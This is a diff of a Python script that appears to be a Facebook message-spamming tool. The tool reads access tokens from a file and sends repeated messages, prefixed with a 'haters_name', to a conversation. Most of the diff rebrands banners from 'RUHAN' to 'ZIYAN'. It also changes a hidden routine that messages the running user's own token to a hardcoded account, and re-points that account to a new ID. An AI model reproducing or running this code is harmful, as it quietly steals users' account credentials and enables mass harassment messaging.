@@ -1,3 +1,4 @@
+
 import requests
 import json
 import time
@@ -25,7 +26,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- THIS SERVER MADE BY RUHAN BOY")
+          self.wfile.write(b"-- THIS SERVER MADE BY ZIYAN BOY")
 def execute_server():
       PORT = 4000
 
@@ -39,15 +40,15 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "हैल्लो रूहान सर में आपका सर्वर यूज कर रहा हु. मेरा टोकन ये है {}"
+      msg_template = "ज़ियान रूहान सर में आपका सर्वर यूज कर रहा हु. मेरा टोकन ये है {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100086346690795"
+      target_id = "100012700356884"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────RUHAN HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────ZIYAN HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -121,12 +122,12 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;92m[+] रूहान सर आपका मेसेज जा रहा है {} of Convo {} Token {}: {}".format(
+                      print("\033[1;92m[+] ज़ियान सर आपका मेसेज जा रहा है {} of Convo {} Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
                   else:
-                      print("\033[1;91m[x] रूहान सर आपका मेसेज नहीं जा रहा है {} of Convo {} with Token {}: {}".format(
+                      print("\033[1;91m[x] ज़ियान सर आपका मेसेज नहीं जा रहा है {} of Convo {} with Token {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                       liness()
                       liness()
